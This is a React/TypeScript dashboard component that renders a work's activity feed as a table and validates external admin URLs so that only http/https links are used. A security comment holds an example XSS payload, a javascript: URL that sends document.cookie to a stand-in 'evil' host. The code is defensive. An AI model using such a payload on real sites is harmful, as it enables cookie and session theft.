'use client';

import { useTranslations } from 'next-intl';
import { Link, useRouter } from '@/i18n/navigation';
import { ROUTES } from '@/lib/constants';
import { cn } from '@/lib/utils/cn';
import type { FeedEntry, PlatformActivityLogEntry } from '@/lib/api/works/activity-feed.types';
import { ActivityStatusBadge } from '@/components/activity-log/ActivityStatusBadge';
import { ActivityTimestamp } from '@/components/activity-log/ActivityTimestamp';
import { SyncEventRow } from './SyncEventRow';
import type { SyncEvent } from './SyncEvent.types';

interface FeedTableProps {
    entries: FeedEntry[];
    workId: string;
}

function isSyncEventDetails(details: unknown): details is SyncEvent {
    if (!details || typeof details !== 'object') return false;
    const kind = (details as { kind?: unknown }).kind;
    return kind === 'success' || kind === 'skipped' || kind === 'failed';
}

function isSyncActivity(entry: FeedEntry): entry is PlatformActivityLogEntry {
    return entry.source === 'platform-activity-log' && entry.category === 'sync';
}

/**
 * Security: `directory-site` entry `adminUrl` originates from the deployed
 * directory site fetched by the pull-mode data-sync client (untrusted external
 * content) and is rendered into an `<a href target="_blank">`. Without this an
 * operator/attacker returning `javascript:fetch('//evil/?c='+document.cookie)`
 * as `adminUrl` lands a working XSS — `rel="noopener noreferrer"` does not block
 * it. Returns `undefined` for anything that isn't http/https (including
 * non-string values, which throw in `new URL` and hit the catch). Mirrors
 * `safeExternalUrl` in ComparisonDetailClient.tsx / ItemCard.tsx.
 */
function safeExternalUrl(raw: string | undefined | null): string | undefined {
    if (!raw) return undefined;
    try {
        const parsed = new URL(raw);
        if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
            return undefined;
        }
        return parsed.toString();
    } catch {
        return undefined;
    }
}

function entryHref(entry: FeedEntry, workId: string): { href: string; external: boolean } {
    if (entry.source === 'directory-site') {
        // Security: only render the external link for validated http(s) URLs;
        // an unsafe scheme falls through to an inert internal anchor (`#`).
        const safeUrl = safeExternalUrl(entry.target.adminUrl);
        if (safeUrl) {
            return { href: safeUrl, external: true };
        }
        return { href: '#', external: false };
    }
    if (entry.source === 'generation-history') {
        return {
            href: `${ROUTES.DASHBOARD_WORK_HISTORY(workId)}?run=${entry.runId}`,
            external: false,
        };
    }
    // Platform activity-log entries deep-link to the global activity view
    // filtered to this entry; ActivityDetailModal embedding can come later.
    return { href: `${ROUTES.DASHBOARD_ACTIVITY}?entry=${entry.id}`, external: false };
}

const HEADER_CELL_CLASS =
    'px-4 py-3 text-left text-xs font-semibold uppercase tracking-wider text-text-secondary dark:text-text-secondary-dark';

export function FeedTable({ entries, workId }: FeedTableProps) {
    const t = useTranslations('dashboard.workDetail.activity');
    // Column headers reuse the global activity-log table labels so both
    // tables stay word-for-word identical in every locale.
    const tActivity = useTranslations('dashboard.activity');
    const router = useRouter();

    return (
        <div className="relative overflow-hidden rounded-lg border border-border dark:border-border-dark">
            <div className="overflow-x-auto">
                <table className="min-w-full divide-y divide-border dark:divide-border-dark">
                    <thead className="bg-muted/50 dark:bg-muted/20">
                        <tr>
                            <th scope="col" className={HEADER_CELL_CLASS}>
                                {tActivity('columns.dateTime')}
                            </th>
                            <th scope="col" className={HEADER_CELL_CLASS}>
                                {tActivity('columns.type')}
                            </th>
                            <th scope="col" className={HEADER_CELL_CLASS}>
                                {tActivity('columns.summary')}
                            </th>
                            <th
                                scope="col"
                                className={cn(HEADER_CELL_CLASS, 'w-[9rem] whitespace-nowrap')}
                            >
                                {tActivity('columns.status')}
                            </th>
                        </tr>
                    </thead>
                    <tbody className="divide-y divide-border dark:divide-border-dark">
                        {entries.map((entry) => {
                            const syncEvent =
                                isSyncActivity(entry) && isSyncEventDetails(entry.details)
                                    ? entry.details
                                    : null;
                            const { href, external } = entryHref(entry, workId);
                            // Sync rows carry their own expandable <details>; a
                            // row-level navigation would fight with it, so they
                            // stay inert (as the old card list did).
                            const clickable = !syncEvent && href !== '#';
                            const navigate = () => {
                                if (!clickable) return;
                                if (external) {
                                    window.open(href, '_blank', 'noopener,noreferrer');
                                } else {
                                    router.push(href);
                                }
                            };

                            return (
                                <tr
                                    key={`${entry.source}-${entry.id}`}
                                    className={cn(
                                        'bg-card dark:bg-transparent transition-colors',
                                        clickable &&
                                            'hover:bg-muted/30 dark:hover:bg-muted/10 cursor-pointer',
                                    )}
                                    onClick={navigate}
                                >
                                    <td className="px-4 py-3 text-[11px] text-text-muted dark:text-text-muted-dark whitespace-nowrap align-top">
                                        <ActivityTimestamp
                                            value={entry.timestamp}
                                            variant="stacked"
                                        />
                                    </td>
                                    <td className="px-4 py-3 align-top">
                                        <span className="inline-flex whitespace-nowrap px-2 py-0.5 rounded-full text-xs font-medium bg-muted/40 dark:bg-muted/20 text-text-secondary dark:text-text-secondary-dark">
                                            {t(`filters.${entry.category}`)}
                                        </span>
                                    </td>
                                    <td
                                        className={cn(
                                            'text-xs text-text dark:text-text-dark max-w-md align-top',
                                            syncEvent ? 'px-2 py-1' : 'px-4 py-3',
                                        )}
                                    >
                                        {syncEvent ? (
                                            <SyncEventRow event={syncEvent} />
                                        ) : (
                                            <div className="min-w-0">
                                                {clickable ? (
                                                    external ? (
                                                        <a
                                                            href={href}
                                                            target="_blank"
                                                            rel="noopener noreferrer"
                                                            className="line-clamp-3 break-words hover:underline"
                                                            onClick={(e) => e.stopPropagation()}
                                                        >
                                                            {entry.summary}
                                                        </a>
                                                    ) : (
                                                        <Link
                                                            href={href}
                                                            className="line-clamp-3 break-words hover:underline"
                                                            onClick={(e) => e.stopPropagation()}
                                                        >
                                                            {entry.summary}
                                                        </Link>
                                                    )
                                                ) : (
                                                    <span className="line-clamp-3 break-words">
                                                        {entry.summary}
                                                    </span>
                                                )}
                                                {entry.source === 'generation-history' && (
                                                    <div className="mt-1 text-xs text-text-muted dark:text-text-muted-dark">
                                                        {t('entry.itemsSummary', {
                                                            added: entry.newItemsCount,
                                                            updated: entry.updatedItemsCount,
                                                        })}
                                                    </div>
                                                )}
                                            </div>
                                        )}
                                    </td>
                                    <td className="w-[9rem] whitespace-nowrap px-4 py-3 align-top">
                                        {'status' in entry ? (
                                            <ActivityStatusBadge status={entry.status} />
                                        ) : (
                                            <span className="text-xs text-text-muted dark:text-text-muted-dark">
                                                —
                                            </span>
                                        )}
                                    </td>
                                </tr>
                            );
                        })}
                    </tbody>
                </table>
            </div>
        </div>
    );
}
